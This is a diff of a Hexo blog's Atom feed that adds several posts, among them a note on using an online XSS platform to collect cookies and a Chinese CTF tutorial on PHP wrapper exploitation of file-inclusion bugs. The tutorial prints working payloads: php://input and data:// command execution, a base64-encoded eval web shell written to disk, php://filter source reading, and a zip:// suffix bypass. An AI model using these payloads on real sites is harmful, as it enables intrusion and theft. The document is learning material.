@@ -1,25 +1,142 @@
 <?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
-  <title>Fomalhaut🥝</title>
+  <title>梦~醒🥝</title>
   
   
-  <link href="https://www.fomal.cc/atom.xml" rel="self"/>
+  <link href="https://example.com/atom.xml" rel="self"/>
   
-  <link href="https://www.fomal.cc/"/>
-  <updated>2022-10-23T14:00:00.000Z</updated>
-  <id>https://www.fomal.cc/</id>
+  <link href="https://example.com/"/>
+  <updated>2024-11-29T06:03:49.573Z</updated>
+  <id>https://example.com/</id>
   
   <author>
-    <name>Fomalhaut🥝</name>
+    <name>梦~醒🥝</name>
     
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>Hello World</title>
+    <link href="https://example.com/posts/4a17b156.html"/>
+    <id>https://example.com/posts/4a17b156.html</id>
+    <published>2024-11-29T03:17:28.254Z</published>
+    <updated>2024-11-29T06:03:49.573Z</updated>
+    
+    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start">Quick Start</h2><h3 id="Create-a-new-post">Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server">Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files">Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites">Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>test</title>
+    <link href="https://example.com/posts/d87f7e0c.html"/>
+    <id>https://example.com/posts/d87f7e0c.html</id>
+    <published>2024-11-28T11:48:07.000Z</published>
+    <updated>2024-11-29T06:03:49.575Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="http://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128195944952.png" alt="image-20241128195944952"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;img src=&quot;http://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128195944952.png&quot; alt=&quot;image-20241128195944952&quot;&gt;&lt;/p&gt;
+</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>XSS在线平台使用</title>
+    <link href="https://example.com/posts/169f5f8e.html"/>
+    <id>https://example.com/posts/169f5f8e.html</id>
+    <published>2024-11-27T16:00:00.000Z</published>
+    <updated>2024-11-29T06:03:49.580Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><p>前言：由于自己搭建的xss平台需要服务器才能获取其他网络的cookie，所以无法接收赛题的cookie，最简便的方法还是使用在线平台，虽然可能有一定风险，以后买服务器了再搭建自己的吧</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191835876.png" alt="image-20241128191835876"></p><p>登录后，直接创建项目就行</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191919585.png" alt="image-20241128191919585"></p><p>传入的地址如下：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191232646.png" alt="image-20241128191232646"></p><p>然后就能在平台上接受到了</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128192046521.png" alt="image-20241128192046521"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;blockquote&gt;
+&lt;p&gt;前言：由于自己搭建的xss平台需要服务器才能获取其他网络的cookie，所以无法接收赛题的cookie，最简便的方法还是使用在线平台，虽然可能有一定风险，以后买服务器了再搭建自己的吧&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&quot;h</summary>
+      
+    
+    
+    
+    <category term="CTF" scheme="https://example.com/categories/CTF/"/>
+    
+    
+    <category term="其他姿势" scheme="https://example.com/tags/%E5%85%B6%E4%BB%96%E5%A7%BF%E5%8A%BF/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>使用方法</title>
+    <link href="https://example.com/posts/46becb75.html"/>
+    <id>https://example.com/posts/46becb75.html</id>
+    <published>2024-11-26T15:14:38.000Z</published>
+    <updated>2024-11-29T06:03:49.576Z</updated>
+    
+    <content type="html"><![CDATA[<p>三、编辑个人博客<br>1、当前hexo/blog文件中，选中’Git Bash Here‘，打开git命令窗口</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/19ea8969657c486800af29cc338d0b6b.jpeg" alt="请添加图片描述"></p><p>2、git命令窗口输入，hexo new “文章标题”</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/19ea8969657c486800af29cc338d0b6b.jpeg" alt=""></p><p>3、查看文章地址：\hexo\blog\source_posts</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/a5e24917ef59d1af778733a3a726ba81.jpeg" alt="请添加图片描述"></p><p>4、打开文章，并编辑内容</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/47f8dc4b9424e8bdfef0123ff6fdb49d.jpeg" alt="请添加图片描述"></p><p>5、运行 hexo g 生成网页<br>6、运行 hexo s 运行博客</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/f3f2796ba86ab5e4d8900da52dd82b60.jpeg" alt="请添加图片描述"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/08e8a1e8545132416c225e84674cca10.jpeg" alt="请添加图片描述"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;三、编辑个人博客&lt;br&gt;
+1、当前hexo/blog文件中，选中’Git Bash Here‘，打开git命令窗口&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://gitee.com/star3119391396/cloudimage/raw/master/img/19e</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>php伪协议</title>
+    <link href="https://example.com/posts/5a47ecbe.html"/>
+    <id>https://example.com/posts/5a47ecbe.html</id>
+    <published>2024-10-21T16:00:00.000Z</published>
+    <updated>2024-11-29T06:03:49.579Z</updated>
+    
+    <content type="html"><![CDATA[<p>[TOC]</p><h1>php伪协议</h1><p>php://伪协议是php提供的一些输入输出流访问功能，允许访问php的输入输出流，标准输入输出和错误描述符，内存中，磁盘备份的临时文件流，以及可以操作其他读取和写入文件的过滤器。</p><p>首先看到题目提示传个file，遂/?file=…一个随意参数，而后得到源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;allow_url_include&quot;</span>,<span class="string">&quot;on&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: text/html; charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;flag 在flag.php中&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;传入一个file试试&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span> flag 在flag.php中</span><br></pre></td></tr></table></figure><p>发现有include_once函数；<br>include_once()：在脚本执行期间包含并运行指定文件。该函数和include 函数类似，两者唯一的区别是 使用该函数的时候，php会加检查指定文件是否已经被包含过，如果是，则不会再被包含。</p><p>于是利用伪协议构造，</p><p>php://filter/convert.base64-encode/resource=flag.php</p><p>得到经过Base64加密的flag，解密即可。</p><h2 id="常见的php伪协议">常见的php伪协议</h2><p>1）file:// 访问本地文件系统</p><p>2）http:// 访问HTTP(S)网址</p><p>3）ftp:// 访问FTP(S)URL</p><p>4)php:// 访问各个输出输入流</p><p>5)zlib:// 处理压缩流</p><p>6)data:// 读取数据</p><p>7)glob:// 查找匹配的文件路径模式</p><p>8)phar:// PHP归档</p><p>9)rar:// RAR数据压缩</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/QQ%E5%9B%BE%E7%89%8720240915150327.png" alt=""></p><h2 id="协议详细：">协议详细：</h2><p>一、环境概要：<br>PHP伪协议指的是PHP所支持的协议与封装协议，在web渗透漏洞利用中常用于配合文件包含进行web攻击，从而获取网站权限。</p><p>1.php.ini配置文件参数：</p><p>allow_url_fopen ：on #默认开启 ，表示允许url里的封装协议访问文件；<br>allow_url_include：off #默认关闭，表示不允许包含url里的封装协议包含文件；<br>2.常用伪协议条件及方法</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/e5f2a0a7a079c20ae6af01a5753bdd82.png" alt="在这里插入图片描述"></p><p>3.注意点</p><p>①各个伪协议适用php版本不尽相同，以下php版本在5.2~5.7之间疯狂来回切换，到最后已经无法总结各协议实验成功所使用的php版本。总之：php&gt;5.2.0<br>②以下所有实例均使用Firefox浏览器</p><p>二、伪协议实例</p><h4 id="1-php-input">1.php://input</h4><p>php://input 是可以访问请求原始数据的只读流。在POST 请求的情况下，由于 php://input 不依赖于特定的 php.ini 指令，可以使用它代替 $HTTP_RAW_POST_DATA。</p><p>php://input   (执行post中的命令)</p><p>注意点<br>①input必须以post请求<br>②enctype=“multipart/form-data” 的时候 php://input 是无效的<br>③allow_url_include=on</p><p>实例一：php://input将文件包含漏洞变成代码执行漏洞</p><p>①目标网站存在包含漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>②使用php://input，将执行代码通过在POST data中提交</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;ipconfig&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/e5f2a0a7a079c20ae6af01a5753bdd82.png" alt=""></p><p>实例二：php://input利用文件包含写入shell</p><p>①目标网站存在包含漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>②使用php://input，将执行代码通过在POST data中提交</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#post方式提交</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;test.php&quot;</span>,<span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NjJ10pPz4=&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>执行成功会在当前目录下生成一句话shell，可直接连接</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/075dbc6a76924f750b80ef7bcd0a8964.png" alt="在这里插入图片描述"></p><p>实例三：php://input协议直接写入shell</p><p>①含有php://input的代码漏洞文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>); </span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$data</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>POST直接传参执行php代码：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/b14c8e1c01df529a99ef1a94150ba4f7.png" alt="在这里插入图片描述">同理，这里在post数据提交生成shell的代码，会在同级目录下生成shell：</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo file_put_contents(<span class="string">&quot;ceshi.php&quot;</span>,base64_decode(<span class="string">&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NjJ10pPz4=&quot;</span>))<span class="comment">;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/ab163614fd0d637a0c968b0d80ba168c.png" alt="在这里插入图片描述"></p><p>需要注意的是，此方法使用条件为：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>.allow_url_include = <span class="literal">On</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">2</span>. PHP &gt;= <span class="number">5</span>.<span class="number">2</span>.<span class="number">0</span></span><br><span class="line"><span class="attribute">3</span>. 当前文件有写入权限</span><br></pre></td></tr></table></figure><h4 id="2-data-URL代码执行">2.data:URL代码执行</h4><p>将攻击代码转换为data:URL形式进行攻击，以传递相应格式的数据用来执行PHP代码。为了防止直接在URL连接中的一些敏感字符被waf检测拦截，可将攻击代码进行base64编码。</p><p>#文件包含代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]<span class="meta">?&gt;</span>   </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>访问执行：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127.0.0.1</span>/<span class="number">1</span>.php?file=data:text/plain;base64,PD9waHAKcGhwaW5mbygpOwo/Pg==</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/0d8db3c74cf4384ce95fee2a92a3286a.png" alt=""></p><p>条件：allow_url_include = on&amp;allow_url_fopen()=on&amp; PHP &gt;= 5.2.0</p><h4 id="3-php-filter读取源代码">3.php://filter读取源代码</h4><p>php://filter用于读取网站源码。读取php文件源码内容(直接包含脚本格式文件会解析无法直接获取文件源码)。用法：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.1</span><span class="number">.3</span>/<span class="number">1.</span>php?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=<span class="number">1.</span>php</span><br></pre></td></tr></table></figure><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/<span class="built_in">read</span>=<span class="built_in">convert</span>.<span class="built_in">base64</span>-encode/resource=/<span class="built_in">var</span>/www/html/flag.php(使用<span class="built_in">base64</span>读取源文件)</span><br></pre></td></tr></table></figure><blockquote><p>有时题目会需要我们必须包含某个字符串<br>技巧是php://filter伪协议可以套一层协议<br>比如我们需要包含woofers这个字符串：php://filter/read=convert.base64-encode/woofers/resource=index</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/81ffdc55f82671f8dcb54cf09e267f66.png" alt="在这里插入图片描述"></p><h4 id="4-file-物理路径包含文件">4.file://物理路径包含文件</h4><p>file:// 协议在allow_url_fopen,allow_url_include都为off的情况下也可以正常使用：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.3/1.php?filename=file:///C:<span class="symbol">\\</span>phpStudy<span class="symbol">\\</span>WWW<span class="symbol">\\</span>fileinclude<span class="symbol">\\</span>2<span class="symbol">\\</span>1.txt</span><br></pre></td></tr></table></figure><p>file://机器的IP地址/目录/文件（这个后面不一定需要跟文件，如果只写一个目录的话就是查看该目录下有哪些文件）<br>对于本地机器，机器的IP地址变成127.0.0.1或localhost或干脆什么也不写。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/106b1e158dda18f56b78e9000c5b0dcc.png" alt="在这里插入图片描述"></p><h4 id="5-data-：利用文件包含-data-可进行命令执行">5.data://：利用文件包含&amp;data://可进行命令执行</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">192.168.1.3</span>/<span class="number">1</span>.php?filename=data://text/plain,%<span class="number">3</span>C?php%<span class="number">20</span>system(%<span class="number">27</span>whoami%<span class="number">27</span>);?%<span class="number">3</span>E</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/42786ed141197be7c7152764d03fb81d.png" alt="在这里插入图片描述"></p><p>data协议就是会把后面的一段字符串当成php代码区执行，所以读取flag.php的文件就可以看到flag了</p><p>例如：</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">?c=data://text/plain,</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;tac flag.php&quot;</span>);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>php://data/plain;base64,XXXX（base64编码后的数据）</p><p>data:text/plain,XXX</p><p>可能的编码的问题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在编成base64的时候出现了+。而浏览器不认识+号。所以解决方法：</p><p>1.不写后面的?&gt; 因为PHP里面其实不需要写后面的 前面的；号就已经说明结束了。如果没有；号就必须写?&gt;作为结束。<br>2.添加空格改变base64编码。<br>3.将+号换成%2b<br><strong>其实不需要通过base64编码来实现！！！</strong><br><strong>将</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>改变成url编码。这样浏览器可以识别！</strong></p><h4 id="6-zip-绕过文件包含下的附加后缀">6.zip://绕过文件包含下的附加后缀</h4><p>以下两串代码是对文件后缀进行验证或修改然后再进行包含。对于此类情况，如果要包含非预定文件后缀的文件，可以通过%00截断进行绕过。但是%00截断在php版本5.3.4之后就失效了，而且还要考虑GPC，限制比较严重。除此之外，可以通过zip协议和phar协议来包含文件，突破附加后缀限制。</p><p>验证包含对象文件后缀是否为jpg，如果是才进行包含</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$file</span>, -<span class="number">4</span>)) == <span class="string">&quot;.jpg&quot;</span>)&#123;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>#直接为包含对象添加jpg后缀，然后进行包含</p><?php$file = $_GET['file'];include($file.'.jpg');?><h2 id="绕过方法：">绕过方法：</h2><p>绕过方法：<br>①实战情况下往目标站点上传zip文件，里面压缩着一个jpg格式的php脚本。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/46fab7eacc6b0f867e3e07462fc016e1.png" alt="在这里插入图片描述"></p><p>②构造zip://php.zip#php.jpg，进行zip://伪协议绕过后缀名限制。这里将压缩文件里面的内容修改为在当前目录下生成一句话即可getshell。</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/<span class="built_in">file</span>.php?<span class="built_in">file</span>=zip://php.zip%<span class="number">23</span>php.jpg</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/7105d73de0cdab6f3d9e995d3e87c295.png" alt="在这里插入图片描述"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
+&lt;h1&gt;php伪协议&lt;/h1&gt;
+&lt;p&gt;php://伪协议是php提供的一些输入输出流访问功能，允许访问php的输入输出流，标准输入输出和错误描述符，内存中，磁盘备份的临时文件流，以及可以操作其他读取和写入文件的过滤器。&lt;/p&gt;
+&lt;p&gt;首先看到题目提示传个</summary>
+      
+    
+    
+    
+    <category term="CTF" scheme="https://example.com/categories/CTF/"/>
+    
+    
+    <category term="web姿势" scheme="https://example.com/tags/web%E5%A7%BF%E5%8A%BF/"/>
+    
+  </entry>
+  
+  <entry>
     <title>Markdown语法与外挂标签写法汇总</title>
-    <link href="https://www.fomal.cc/posts/2013454d.html"/>
-    <id>https://www.fomal.cc/posts/2013454d.html</id>
+    <link href="https://example.com/posts/2013454d.html"/>
+    <id>https://example.com/posts/2013454d.html</id>
     <published>2022-08-09T10:19:03.000Z</published>
     <updated>2022-10-23T14:00:00.000Z</updated>
     
@@ -30,12 +147,12 @@
     
     
     
-    <category term="演示" scheme="https://www.fomal.cc/categories/%E6%BC%94%E7%A4%BA/"/>
+    <category term="演示" scheme="https://example.com/categories/%E6%BC%94%E7%A4%BA/"/>
     
     
-    <category term="Markdown" scheme="https://www.fomal.cc/tags/Markdown/"/>
+    <category term="Markdown" scheme="https://example.com/tags/Markdown/"/>
     
-    <category term="外挂标签" scheme="https://www.fomal.cc/tags/%E5%A4%96%E6%8C%82%E6%A0%87%E7%AD%BE/"/>
+    <category term="外挂标签" scheme="https://example.com/tags/%E5%A4%96%E6%8C%82%E6%A0%87%E7%AD%BE/"/>
     
   </entry>
   
